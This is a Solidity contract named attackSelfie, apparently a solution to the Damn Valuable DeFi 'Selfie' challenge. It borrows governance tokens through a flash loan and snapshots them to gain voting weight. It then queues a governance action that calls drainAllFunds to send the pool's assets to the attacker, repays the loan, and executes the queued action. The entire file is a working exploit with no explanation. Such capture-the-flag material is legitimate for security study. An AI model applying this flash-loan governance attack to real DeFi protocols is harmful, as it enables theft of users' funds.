// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";

interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable ;
}

interface ISelfiePool{
    function flashLoan(uint256 borrowAmount) external ;
    function drainAllFunds(address receiver) external;
}

contract attackSelfie{

    DamnValuableTokenSnapshot governance_token;
    ISimpleGovernance SimpleGovernance;
    ISelfiePool pool;
    address attacker;
    uint256 actionId;
    constructor(address _SimpleGovernance,address _pool){
        SimpleGovernance = ISimpleGovernance(_SimpleGovernance);
        pool=ISelfiePool(_pool);
        attacker=msg.sender;
    }
    function loan(uint256 amount)public{
        pool.flashLoan(amount);
    }
    function receiveTokens(address _addr,uint256 amount) external {
        governance_token=DamnValuableTokenSnapshot(_addr);
        governance_token.snapshot();
        actionId=SimpleGovernance.queueAction(address(pool),abi.encodeWithSignature("drainAllFunds(address)",attacker),0);
        governance_token.transfer(msg.sender,amount);
    }

    function attack()public{
        SimpleGovernance.executeAction(actionId);
    }

}